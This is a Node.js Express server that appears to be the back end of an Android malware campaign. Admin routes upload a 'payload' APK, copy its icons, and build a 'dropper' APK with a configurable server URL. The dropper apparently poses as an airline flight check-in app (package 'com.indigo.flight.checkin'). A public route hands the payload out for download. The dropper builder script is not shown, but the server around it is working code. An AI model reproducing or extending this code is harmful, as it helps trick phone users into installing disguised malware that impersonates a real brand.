const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const { initDB } = require('./db');
const { requireLock, requireAdmin } = require('./middleware');
const deviceRoutes = require('./routes/device');
const adminRoutes = require('./routes/admin');
const authRoutes = require('./routes/auth');
const demoRoutes = require('./routes/demo');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_DIR = path.join(__dirname, 'data');
const DOWNLOADS_DIR = path.join(__dirname, 'public', 'downloads');
const ICONS_DIR = path.join(DATA_DIR, 'payload_icons');
const POSTER_DIR = path.join(DATA_DIR, 'poster');
[DATA_DIR, DOWNLOADS_DIR, ICONS_DIR, POSTER_DIR].forEach(d => {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
});

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, DOWNLOADS_DIR),
  filename: (req, file, cb) => cb(null, 'latest.apk')
});
const upload = multer({ storage, limits: { fileSize: 100 * 1024 * 1024 } });

const posterStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, POSTER_DIR),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, 'poster' + (ext === '.webp' ? '.webp' : '.png'));
  }
});
const posterUpload = multer({ storage: posterStorage, limits: { fileSize: 10 * 1024 * 1024 } });

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use('/api/device', deviceRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/lock', authRoutes);
app.use('/api', demoRoutes);

const { execSync } = require('child_process');

function extractIcons(apkPath) {
  const tmpDir = path.join(DATA_DIR, 'tmp_icons_' + Date.now());
  fs.mkdirSync(tmpDir, { recursive: true });
  try {
    execSync(`unzip -o "${apkPath}" "res/mipmap-*/*" "res/*/ic_launcher*" "res/*/app_icon*" "res/*/icon*" -d "${tmpDir}" 2>/dev/null || true`, { stdio: 'pipe' });
    execSync(`unzip -o "${apkPath}" "res/mipmap-anydpi-v26/*" -d "${tmpDir}" 2>/dev/null || true`, { stdio: 'pipe' });
    const extracted = path.join(tmpDir, 'res');
    if (!fs.existsSync(extracted) || fs.readdirSync(extracted).length === 0) {
      const allFiles = execSync(`unzip -l "${apkPath}" | grep -iE "icon|mipmap|launcher" | head -20`, { stdio: 'pipe' }).toString().trim();
      console.log('No icons found in payload.' + (allFiles ? ' Found: ' + allFiles.substring(0, 300) : ''));
      fs.rmSync(tmpDir, { recursive: true, force: true });
      return;
    }
    fs.rmSync(ICONS_DIR, { recursive: true, force: true });
    fs.mkdirSync(ICONS_DIR, { recursive: true });
    let count = 0;
    for (const d of fs.readdirSync(extracted)) {
      const srcDir = path.join(extracted, d);
      if (!fs.statSync(srcDir).isDirectory()) continue;
      const dstDir = path.join(ICONS_DIR, d.replace(/-v\d+$/, ''));
      fs.mkdirSync(dstDir, { recursive: true });
      for (const f of fs.readdirSync(srcDir)) {
        fs.copyFileSync(path.join(srcDir, f), path.join(dstDir, f));
        count++;
      }
    }
    console.log(`Extracted ${count} icon files from payload`);
  } catch (e) { console.log('Icon extraction error:', e.message.substring(0, 200)); }
  fs.rmSync(tmpDir, { recursive: true, force: true });
}

app.post('/api/admin/upload-payload', requireLock, requireAdmin, upload.single('apk'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
  extractIcons(req.file.path);
  res.json({ success: true, message: 'Payload uploaded', filename: 'latest.apk' });
});

app.post('/api/admin/upload-poster', requireLock, requireAdmin, posterUpload.single('poster'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
  res.json({ success: true, message: 'Poster uploaded' });
});

app.get('/api/download/latest.apk', (req, res) => {
  const filePath = path.join(DOWNLOADS_DIR, 'latest.apk');
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'No payload uploaded yet' });
  res.download(filePath, 'latest.apk');
});

app.post('/api/admin/generate-dropper', requireLock, requireAdmin, async (req, res) => {
  const { serverUrl, appName, packageName } = req.body;
  if (!serverUrl || !appName) return res.status(400).json({ error: 'serverUrl and appName required' });

  const dropperDir = path.join(__dirname, '..', 'dropper');
  const buildScript = path.join(dropperDir, 'build.sh');
  const outputApk = path.join(dropperDir, 'output', 'indigo_dropper.apk');

  if (!fs.existsSync(buildScript)) return res.status(500).json({ error: 'build.sh not found' });

  const appPkg = packageName || 'com.indigo.webview';
  const dropperPkg = 'com.indigo.flight.checkin';
  const posterFile = fs.existsSync(path.join(POSTER_DIR, 'poster.webp')) ? path.join(POSTER_DIR, 'poster.webp') :
                     fs.existsSync(path.join(POSTER_DIR, 'poster.png')) ? path.join(POSTER_DIR, 'poster.png') : '';
  const hasIcons = fs.existsSync(ICONS_DIR) && fs.readdirSync(ICONS_DIR).length > 0;

  const buildEnv = {
    ...process.env,
    NEW_SERVER_URL: serverUrl,
    NEW_APP_NAME: appName,
    NEW_APP_PACKAGE: appPkg,
    NEW_PACKAGE: dropperPkg,
    PAYLOAD_ICONS_DIR: hasIcons ? ICONS_DIR : '',
    POSTER_FILE: posterFile
  };

  try {
    execSync(`bash "${buildScript}"`, { cwd: dropperDir, stdio: 'pipe', timeout: 120000, shell: '/bin/bash', env: buildEnv });
    if (!fs.existsSync(outputApk)) return res.status(500).json({ error: 'Build failed - no output APK' });
    res.download(outputApk, 'indigo_dropper.apk');
  } catch (e) {
    const stderr = e.stderr ? e.stderr.toString().substring(0, 1500) : '';
    const stdout = e.stdout ? e.stdout.toString().substring(0, 1500) : '';
    const msg = stderr || stdout || e.message;
    res.status(500).json({ error: 'Build failed: ' + msg });
  }
});

app.get('/api/notification-sound', (req, res) => res.sendStatus(204));
app.get('/api/tts', (req, res) => res.json({ message: 'TTS endpoint' }));

async function start() {
  await initDB();
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Lock screen: http://localhost:${PORT}/lock.html`);
  });
}

start().catch(err => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
